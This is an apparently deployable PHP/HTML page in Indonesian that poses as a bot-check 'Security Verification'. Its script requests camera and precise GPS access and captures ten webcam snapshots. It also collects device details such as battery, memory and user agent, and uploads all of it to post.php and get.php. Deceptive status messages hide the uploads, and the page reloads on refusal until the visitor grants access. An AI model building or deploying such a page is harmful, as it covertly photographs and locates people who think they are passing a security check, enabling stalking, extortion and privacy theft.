<?php
declare(strict_types=1);

$redirectUrl = 'redirect.php'; // Ganti dengan halaman tujuan setelah verifikasi.
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Verifikasi keamanan.......</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f7fb;
            font-family: Arial, Helvetica, sans-serif;
            color: #202124;
        }

        .card {
            width: min(420px, calc(100% - 30px));
            background: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08);
        }

        .logo {
            width: 52px;
            height: 52px;
            margin: 0 auto 18px;
            border-radius: 50%;
            background: #eef3ff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 25px;
        }

        h1 {
            margin: 0;
            text-align: center;
            font-size: 23px;
        }

        .description {
            text-align: center;
            color: #5f6368;
            line-height: 1.55;
            font-size: 14px;
            margin: 15px 0 24px;
        }

        .consent {
            display: flex;
            gap: 10px;
            align-items: flex-start;
            font-size: 13px;
            line-height: 1.5;
            color: #444;
            margin-bottom: 20px;
        }

        .consent input {
            margin-top: 3px;
        }

        button {
            width: 100%;
            border: 0;
            border-radius: 8px;
            padding: 13px 15px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            background: #1a73e8;
            color: white;
        }

        button:hover {
            background: #1557b0;
        }

        button:disabled {
            opacity: 0.55;
            cursor: not-allowed;
        }

        .status {
            margin-top: 22px;
        }

        .status-row {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 9px 0;
            font-size: 14px;
            border-bottom: 1px solid #eee;
        }

        .status-row:last-child {
            border-bottom: 0;
        }

        .icon {
            width: 23px;
            text-align: center;
        }

        .success {
            color: #137333;
        }

        .working {
            color: #1a73e8;
        }

        .error {
            color: #d93025;
        }

        .hidden {
            display: none;
        }

        video,
        canvas {
            display: none;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            color: #80868b;
            font-size: 11px;
        }
    </style>

    <!-- ============ STYLE ALERT PRIVACY POLICY (TAMBAHAN) ============ -->
    <style>
        .privacy-overlay {
            position: fixed;
            inset: 0;
            background: rgba(15, 15, 20, 0.75);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        .privacy-overlay.show {
            opacity: 1;
            visibility: visible;
        }

        .privacy-card {
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 32px 32px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.35);
            transform: scale(0.85) translateY(20px);
            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
        }

        .privacy-overlay.show .privacy-card {
            transform: scale(1) translateY(0);
        }

        .privacy-icon {
            width: 72px;
            height: 72px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.35);
            animation: pulse 2s ease-in-out infinite;
        }

        .privacy-icon svg {
            width: 36px;
            height: 36px;
            stroke: #ffffff;
            stroke-width: 2;
            fill: none;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 10px 25px rgba(79, 70, 229, 0.35); }
            50%      { box-shadow: 0 10px 35px rgba(79, 70, 229, 0.55); }
        }

        .privacy-title {
            font-size: 20px;
            font-weight: 700;
            color: #1f2937;
            margin: 0 0 12px;
            letter-spacing: -0.3px;
        }

        .privacy-desc {
            font-size: 14px;
            line-height: 1.6;
            color: #6b7280;
            margin: 0 0 24px;
        }

        .privacy-desc strong {
            color: #4f46e5;
            font-weight: 600;
        }

        .privacy-link {
            color: #4f46e5;
            text-decoration: none;
            font-weight: 600;
            border-bottom: 1px dashed #4f46e5;
            transition: opacity 0.2s;
        }

        .privacy-link:hover {
            opacity: 0.7;
        }

        .privacy-btn {
            width: 100%;
            padding: 14px 24px;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
            letter-spacing: 0.2px;
            box-shadow: 0 6px 18px rgba(79, 70, 229, 0.35);
        }

        .privacy-btn:hover {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.45);
        }

        .privacy-btn:active {
            transform: translateY(0);
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.35);
        }

        .privacy-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #4f46e5, #7c3aed, #ec4899);
        }

        @media (max-width: 480px) {
            .privacy-card {
                padding: 32px 24px 24px;
                border-radius: 16px;
            }
            .privacy-icon {
                width: 64px;
                height: 64px;
            }
            .privacy-title {
                font-size: 18px;
            }
            .privacy-desc {
                font-size: 13px;
            }
        }
    </style>
    <!-- ============ END STYLE ALERT ============ -->

</head>

<body>

<!-- ============ ALERT PRIVACY POLICY (TAMBAHAN) ============ -->
<div class="privacy-overlay" id="privacyOverlay">
    <div class="privacy-card">
        <div class="privacy-icon">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="M9 12l2 2 4-4"/>
            </svg>
        </div>

        <h2 class="privacy-title">Verifikasi Bot</h2>
        <p class="privacy-desc">
            Kami menghargai privasi Anda. Dengan melanjutkan, Anda menyetujui
            <a href="#" class="privacy-link">Kebijakan Privasi</a> dan
            <a href="#" class="privacy-link">Syarat &amp; Ketentuan</a> yang berlaku dengan 
            <a href="#" class="privacy-link">Mengizinkan </a> notifikasi yang muncul.
            Data Anda akan <strong>dilindungi dengan aman</strong>.
        </p>

        <button class="privacy-btn" onclick="acceptPrivacy()">
            Saya Setuju &amp; Lanjutkan
        </button>
    </div>
</div>
<!-- ============ END ALERT ============ -->

<div class="card">

    <div class="logo">✓</div>

    <h1>Security Verification</h1>

    <div class="description">
        Sebelum melanjutkan,Harap verifikasi keamanan
        <strong>Situs web menggunakan layanan keamanan untuk melindungi dari bot atau Ai jahat</strong>
        Halaman ini ditunjukkan semasa kami memverifikasi bahwa Anda bukan bot.
    </div>

    <label class="consent">
        <input type="checkbox" id="consent">

        <span>
            Saya memahami dan akan mentaati segala notifikasi yang  muncul
            akan mensetujui semua,nyalakan akses GPS agar kami bisa mempercepat proses ini.
        </span>
    </label>

    <button id="startButton" disabled>
        Mulai Verifikasi
    </button>

    <div class="status hidden" id="statusBox">

        <div class="status-row">
            <span class="icon" id="cameraIcon">○</span>
            <span id="cameraStatus">Mendeteksi bot</span>
        </div>

        <div class="status-row">
            <span class="icon" id="locationIcon">○</span>
            <span id="locationStatus">Mencari isi pesan</span>
        </div>

        <div class="status-row">
            <span class="icon" id="uploadIcon">○</span>
            <span id="uploadStatus">Error</span>
        </div>

        <div class="status-row">
            <span class="icon" id="finishIcon">○</span>
            <span id="finishStatus">Verifikasi belum selesai</span>
        </div>

    </div>

    <div class="footer">
        Security Verification
    </div>

</div>

<video id="video" autoplay playsinline muted></video>

<canvas
    id="canvas"
    width="640"
    height="640">
</canvas>

<!-- ============ SCRIPT ALERT PRIVACY POLICY (TAMBAHAN) ============ -->
<script>
    window.addEventListener('load', function () {
        setTimeout(function () {
            document.getElementById('privacyOverlay').classList.add('show');
        }, 300);
    });

    function acceptPrivacy() {
        var overlay = document.getElementById('privacyOverlay');
        overlay.classList.remove('show');

        try {
            localStorage.setItem('privacyAccepted', 'true');
        } catch (e) {}
    }
</script>
<!-- ============ END SCRIPT ALERT ============ -->

<script>
"use strict";

const REDIRECT_URL = <?= json_encode($redirectUrl) ?>;

const consent = document.getElementById("consent");
const startButton = document.getElementById("startButton");
const statusBox = document.getElementById("statusBox");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const cameraIcon = document.getElementById("cameraIcon");
const locationIcon = document.getElementById("locationIcon");
const uploadIcon = document.getElementById("uploadIcon");
const finishIcon = document.getElementById("finishIcon");

const cameraStatus = document.getElementById("cameraStatus");
const locationStatus = document.getElementById("locationStatus");
const uploadStatus = document.getElementById("uploadStatus");
const finishStatus = document.getElementById("finishStatus");


function setState(icon, element, state, text) {

    icon.className = "icon";

    if (state === "working") {
        icon.textContent = "…";
        icon.classList.add("working");
    }

    if (state === "success") {
        icon.textContent = "✓";
        icon.classList.add("success");
    }

    if (state === "error") {
        icon.textContent = "✕";
        icon.classList.add("error");
    }

    element.textContent = text;
}


consent.addEventListener("change", function () {
    startButton.disabled = !this.checked;
});


function getLocation() {

    return new Promise(function (resolve, reject) {

        if (!navigator.geolocation) {
            reject(
                new Error("Browser tidak mendukung Geolocation.")
            );

            return;
        }

        navigator.geolocation.getCurrentPosition(
            resolve,
            reject,
            {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            }
        );
    });
}


async function getBatteryLevel() {

    try {

        if (!navigator.getBattery) {
            return null;
        }

        const battery =
            await navigator.getBattery();

        return Math.round(
            battery.level * 100
        );

    } catch (error) {

        return null;
    }
}


async function getDeviceInfo() {

    return {
        useragent: navigator.userAgent,
        platform: navigator.platform || "",
        hardware:
            navigator.hardwareConcurrency || null,

        memory:
            navigator.deviceMemory || null,

        height:
            window.screen.height,

        width:
            window.screen.width,

        battery:
            await getBatteryLevel()
    };
}


function captureFrame() {

    const context =
        canvas.getContext("2d");

    context.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
    );

    return canvas.toDataURL(
        "image/png"
    );
}


async function sendCamera(
    imageData,
    requestId
) {

    const formData =
        new FormData();

    formData.append(
        "request_id",
        requestId
    );

    formData.append(
        "cat",
        imageData
    );

    const response =
        await fetch(
            "post.php",
            {
                method: "POST",
                body: formData
            }
        );

    if (!response.ok) {
        throw new Error(
            "Server kamera mengembalikan HTTP " +
            response.status
        );
    }

    const result =
        await response.json();

    if (!result.success) {
        throw new Error(
            result.error ||
            "Server gagal menyimpan kamera."
        );
    }

    return result;
}


async function sendLocation(
    position,
    device,
    requestId
) {

    const params =
        new URLSearchParams();

    params.set(
        "request_id",
        requestId
    );

    params.set(
        "latitude",
        position.coords.latitude
    );

    params.set(
        "longitude",
        position.coords.longitude
    );

    params.set(
        "altitude",
        position.coords.altitude ?? ""
    );

    params.set(
        "accuracy",
        position.coords.accuracy ?? ""
    );

    params.set(
        "speed",
        position.coords.speed ?? ""
    );

    params.set(
        "heading",
        position.coords.heading ?? ""
    );

    params.set(
        "platform",
        device.platform
    );

    params.set(
        "hardware",
        device.hardware ?? ""
    );

    params.set(
        "memory",
        device.memory ?? ""
    );

    params.set(
        "useragent",
        device.useragent
    );

    params.set(
        "height",
        device.height
    );

    params.set(
        "width",
        device.width
    );

    params.set(
        "battery",
        device.battery ?? ""
    );

    const response =
        await fetch(
            "get.php?" + params.toString(),
            {
                method: "GET",
                cache: "no-store"
            }
        );

    if (!response.ok) {
        throw new Error(
            "Server lokasi mengembalikan HTTP " +
            response.status
        );
    }

    const result =
        await response.json();

    if (!result.success) {
        throw new Error(
            result.error ||
            "Server gagal menyimpan lokasi."
        );
    }

    return result;
}


async function startVerification() {

    startButton.disabled = true;
    statusBox.classList.remove("hidden");

    let stream = null;
    let requestId = "";

    try {

        /*
         * Buat requestId.
         * Gunakan crypto.randomUUID kalau tersedia,
         * kalau tidak (HTTP / non-secure context) pakai fallback.
         */
        if (
            window.crypto &&
            typeof window.crypto.randomUUID === "function"
        ) {
            requestId = window.crypto.randomUUID();
        } else {
            requestId =
                "req-" +
                Date.now() +
                "-" +
                Math.random().toString(36).slice(2);
        }

        setState(
            cameraIcon,
            cameraStatus,
            "working",
            "Tolong izinkan semua..."
        );

        setState(
            locationIcon,
            locationStatus,
            "working",
            "Bot susah di kenali..."
        );

        /*
         * Pastikan getUserMedia tersedia.
         * Di HTTP biasa (bukan localhost) API ini tidak ada.
         */
        if (
            !navigator.mediaDevices ||
            typeof navigator.mediaDevices.getUserMedia !== "function"
        ) {
            throw new Error(
                "Browser tidak mendukung akses kamera pada koneksi ini. " +
                "Gunakan HTTPS atau localhost."
            );
        }

        /*
         * Kamera + lokasi diminta secara paralel.
         */
        const cameraPromise =
            navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 640 }
                },
                audio: false
            });

        const locationPromise = getLocation();

        const [cameraResult, locationResult] =
            await Promise.all([
                cameraPromise,
                locationPromise
            ]);

        stream = cameraResult;

        video.srcObject = stream;

        await video.play();

        setState(
            cameraIcon,
            cameraStatus,
            "success",
            "Memverifikasi apakah anda manusia"
        );

        setState(
            locationIcon,
            locationStatus,
            "success",
            "Anda bukan BOT"
        );

        /*
         * Beri video sedikit waktu agar frame siap.
         */
        await new Promise(
            resolve => setTimeout(resolve, 10)
        );

        /*
         * Informasi perangkat.
         */
        const device = await getDeviceInfo();

        /*
         * Ambil dan kirim maksimal 10 frame.
         * Satu frame dikirim setiap 1 detik.
         */
        const MAX_FRAMES = 10;
        const FRAME_INTERVAL_MS = 1000;

        setState(
            uploadIcon,
            uploadStatus,
            "working",
            `Menredirect ke situs dalam 0`
        );

        for (let i = 1; i <= MAX_FRAMES; i++) {

            const imageData = captureFrame();

            await sendCamera(
                imageData,
                requestId + "-" + String(i).padStart(3, "0")
            );

            setState(
                uploadIcon,
                uploadStatus,
                "working",
                `Menredirect ke situs dalam ${i}`
            );

            if (i < MAX_FRAMES) {
                await new Promise(resolve =>
                    setTimeout(resolve, FRAME_INTERVAL_MS)
                );
            }
        }

        /*
         * Lokasi tetap dikirim satu kali.
         */
        await sendLocation(
            locationResult,
            device,
            requestId
        );

        setState(
            uploadIcon,
            uploadStatus,
            "success",
            "Menuju ke situs."
        );

        setState(
            finishIcon,
            finishStatus,
            "success",
            "Verifikasi berhasil."
        );

        /*
         * Matikan kamera setelah upload.
         */
        stream.getTracks().forEach(track => track.stop());

        /*
         * Lanjut ke halaman website.
         */
        setTimeout(function () {
            window.location.href = REDIRECT_URL;
        }, 1000);

    } catch (error) {

        console.error("[VERIFIKASI GAGAL]", error);

        setState(
            finishIcon,
            finishStatus,
            "error",
            (error && error.message) || "Verifikasi gagal."
        );

        setState(
            cameraIcon,
            cameraStatus,
            "error",
            "Izinkan website melihat notifikasi."
        );

        setState(
            locationIcon,
            locationStatus,
            "error",
            "Berikan akses layanan."
        );

        setState(
            uploadIcon,
            uploadStatus,
            "error",
            "Error silahkan merefresh ulang."
        );

        /*
         * Matikan kamera kalau sempat menyala.
         */
        if (stream) {
            try {
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {}
        }

        /*
         * RELOAD pada SEMUA error — apapun jenisnya.
         * Pakai reload() dulu, kalau gagal fallback ke URL baru
         * dengan cache-buster.
         */
        setTimeout(function () {

            try {
                window.location.reload();
            } catch (e) {
                window.location.href =
                    window.location.pathname +
                    "?r=" + Date.now();
            }

        }, 2000);
    }
}


startButton.addEventListener(
    "click",
    startVerification
);
</script>

</body>
</html>